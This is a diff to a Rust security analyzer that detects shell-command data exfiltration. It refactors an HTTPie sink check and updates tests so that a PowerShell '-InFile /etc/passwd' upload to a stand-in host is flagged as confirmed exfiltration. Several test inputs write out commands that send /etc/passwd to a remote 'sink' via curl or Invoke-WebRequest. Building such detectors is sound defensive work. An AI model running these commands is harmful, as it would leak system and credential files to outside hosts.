@@ -7142,9 +7142,9 @@ fn analyze_httpie_sink(
     if endpoint.is_none() {
         return ExtendedSinkProof::None;
     }
-    let method_sends_body = method.as_deref().map_or(true, |method| {
-        matches!(method, "POST" | "PUT" | "PATCH" | "DELETE")
-    });
+    let method_sends_body = method
+        .as_deref()
+        .is_none_or(|method| matches!(method, "POST" | "PUT" | "PATCH" | "DELETE"));
     stdin |= !ignore_stdin && incoming != FlowProof::Clean && method_sends_body;
     ExtendedSinkProof::Remote {
         sink: DataFlowSink::RemoteHttp,
@@ -8712,10 +8712,6 @@ mod tests {
                 "Get-Content /etc/passwd | Invoke-WebRequest https://sink -Method Post",
                 ShellType::PowerShell,
             ),
-            (
-                "Invoke-WebRequest https://sink -Method Post -InFile /etc/passwd",
-                ShellType::PowerShell,
-            ),
         ] {
             let findings = check_default(input, shell);
             assert!(
@@ -8725,6 +8721,22 @@ mod tests {
                 "unsupported shell read must fail closed: {input} -> {findings:?}"
             );
         }
+
+        // The wallet-exfiltration slice added first-class PowerShell
+        // `-InFile` parsing, so a sensitive file sent to a proven remote POST
+        // sink is now a confirmed source-to-sink flow instead of a fail-closed
+        // incomplete result. See `c05_httpie_powershell_and_dns_roles_are_closed`
+        // for the full positive/negative role coverage.
+        let infile_upload = check_default(
+            "Invoke-WebRequest https://sink -Method Post -InFile /etc/passwd",
+            ShellType::PowerShell,
+        );
+        assert!(
+            infile_upload
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::DataExfiltration),
+            "supported PowerShell -InFile upload must be confirmed: {infile_upload:?}"
+        );
 
         let oversized_source = format!(
             "cat </etc/passwd {} | curl --data-binary @- https://sink",
